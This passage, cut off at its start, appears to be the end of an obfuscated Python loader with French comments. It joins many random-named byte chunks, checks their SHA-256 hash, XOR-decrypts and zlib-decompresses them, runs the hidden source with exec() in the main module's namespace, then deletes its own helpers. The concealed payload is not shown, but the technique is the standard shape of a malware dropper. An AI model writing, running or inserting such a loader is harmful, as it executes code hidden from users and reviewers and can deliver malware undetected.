_cgTIk3vwNgylo8 + _ciH_vicCjvFRHd + _cxpNkrL_KSOWv4 + _ccmhpLbLxxyEYQ + _ciCr2WiIkfgAjK + _coGN9zJ47xpJs7 + _cq2UfvUIKXbrXo + _csmUXWCAeENVoO + _cia3ViHgIkHtkw + _cglP5r_2hu66WF + _cwXkxC6C_F08lQ + _cwnCg89qNEU0eu + _crqXJXuOAc4VXP + _c_g3GFxVLpnTpH + _crMzEBffc5RNVL + _cuWio5Zb2cejck + _chQ8n8UPleJqhM + _ca9BS1GKiQCEDv + _cetC84CgLVbkkh + _cp9IU9IlRdCJ6d + _cmTGzTDhyg42vJ + _ceImp_hn_ltWED + _cvW3N2HncW63gp + _crt_CI09DK6ZOb + _cr1jJf9hJi68ZP + _cqJxfKGz4Ewb6x + _caKRp7GKgDQwcM + _c_q8qt7b7KqL0c + _csCfsjInEVzaua + _cvLX4sqErH0aJf + _cp4zeww2yFsukW + _ceqBldBLjZRpFE + _cv3WHgWOL_mpZz + _cqt4D_zAj3wC65 + _cjbI9dcspEdC0J + _cpjdFbFEwZ3C6g + _caIFtAMZbokKGU + _cjcH0M_NVU1o2w + _cihTi9uoGBk9Vb + _cf6KVNgNpJFBPa + _ct4g_NY2eyfd9r + _czoyNUQ5pyaQkr + _caGM1YsNtOlTlo + _cqyl3PT1994MQS + _chaEA6rj09qeAp + _cw7kkD6RFCSd_0 + _carsoKc1nAwPii + _ciJCNq7q_tTOKn + _cfHQloDDqtWsv_ + _cu9VkhauWs01wd + _ctyWaESE3_QldO + _cby4PFV__y7sB2 + _cvVbuEtfrw2nnk + _cxj2U998e3hQks + _ciaL5ksZrXX7YD + _cvV7iK2P1YuAx9 + _cqjRV_dhfc0my7 + _clsSVbg0GNrnxN + _cxFXmpSbL5yF9a + _cegl8YrdZRcnqk + _creTJ0AQjXPqyS + _ckYDkNZi5osrPT)
if __import__('hashlib').sha256(_pgzVPXL0qODZ0j).hexdigest() != '468e13cb1e14f76c0fb4d15a62236b9b576e659985857e6b127cd4c9e31269a1':
    __import__('sys').exit(1)
_xeRLBHq950i2dA = bytes([217, 43, 199, 85, 224, 182, 148, 39, 1, 248, 178, 151, 42, 247, 58, 45, 191, 209, 49, 179, 23, 15, 91, 112, 198, 140, 36, 48, 135, 20, 27, 163])
_fkeIA_cV7qIZZ5A = bytes([95, 238, 97, 198, 194, 134, 228, 148, 159, 75, 168, 53, 233, 133, 85, 215, 211, 193, 228, 231, 190, 182, 153, 31, 38, 220, 72, 30, 226, 39, 7, 117])

def _fxtjlQ7zxkcJc4j(_byrvd5bpxdDzyd, _kfMzqsA6x0SX7O):
    return bytes(_byrvd5bpxdDzyd[_it4uHsMBtcxSY9] ^ _kfMzqsA6x0SX7O[_it4uHsMBtcxSY9 % len(_kfMzqsA6x0SX7O)] for _it4uHsMBtcxSY9 in range(len(_byrvd5bpxdDzyd)))

def _fdzOBFtIiXlrrBN(_tcDYvuL6ravT8M):
    import zlib
    return zlib.decompress(_tcDYvuL6ravT8M) # Un seul niveau de zlib ici pour simplifier

def _feh4zKIxHAsLAMZ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xoLHf5VJATxnni = _fxtjlQ7zxkcJc4j(_pgzVPXL0qODZ0j, _xeRLBHq950i2dA)
    # 2. Décompression Zlib
    _dtauBgCaJldwEN = _fdzOBFtIiXlrrBN(_xoLHf5VJATxnni)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtauBgCaJldwEN.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nkMA2_A6I5AzZN = _main.__dict__
    _nkMA2_A6I5AzZN.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nkMA2_A6I5AzZN)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feh4zKIxHAsLAMZ()
try:
    del _fxtjlQ7zxkcJc4j, _fdzOBFtIiXlrrBN, _feh4zKIxHAsLAMZ
    del _pgzVPXL0qODZ0j, _xeRLBHq950i2dA, _fkeIA_cV7qIZZ5A
except:
    pass
